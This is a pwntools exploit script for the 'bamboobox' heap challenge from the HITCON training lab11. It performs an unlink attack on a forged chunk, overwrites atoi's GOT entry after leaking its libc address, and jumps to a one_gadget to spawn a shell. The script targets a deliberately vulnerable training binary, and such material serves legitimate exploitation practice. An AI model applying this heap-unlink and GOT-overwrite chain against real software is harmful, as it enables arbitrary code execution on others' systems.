from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_08_hitcontrainning_lab11_bamboobox')
p = process('./data/bin/heap23_08_hitcontrainning_lab11_bamboobox')
libc = elf.libc

sl = lambda s : p.sendline(s.encode() if isinstance(s, str) else s)
sd = lambda s : p.send(s.encode() if isinstance(s, str) else s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode() if isinstance(s, str) else s)
ti = lambda : p.interactive()

def malloc(size,content):
    ru("Your choice:")
    sl('2')
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the name of item:")
    sd(content)

def free(index):
    ru("Your choice:")
    sl('4')
    ru("Please enter the index of item:")
    sl(str(index))

def exit():
    ru("Your choice:")
    sl('5')

def puts():
    ru("Your choice:")
    sl('1')

def change(index,size,content):
    ru("Your choice:")
    sl('3')
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the new name of the item:")
    sd(content)

malloc(0x80,b'aaaa');malloc(0x80,b'bbbb')#step.1
FD = 0x6020c8 - 3*8;BK = FD + 8;py1 = p64(0) + p64(0x81) + p64(FD) + p64(BK) + b"a"*0x60 + p64(0x80) + p64(0x90);change(0,0x90,py1)#step.2
free(1)#step.3
atoi_got = elf.got["atoi"];py2 = b'a'*24 + p64(atoi_got);change(0,len(py2),py2)#step.4 
puts()#step.5
atoi_addr = u64(ru(b'\n--')[4:10].ljust(8,b'\x00'))#step.6
onegadget = atoi_addr - libc.symbols["atoi"] + 0xf03a4;change(0,0x10,p64(onegadget))#step.7
exit()#step.8
p.interactive()#step.9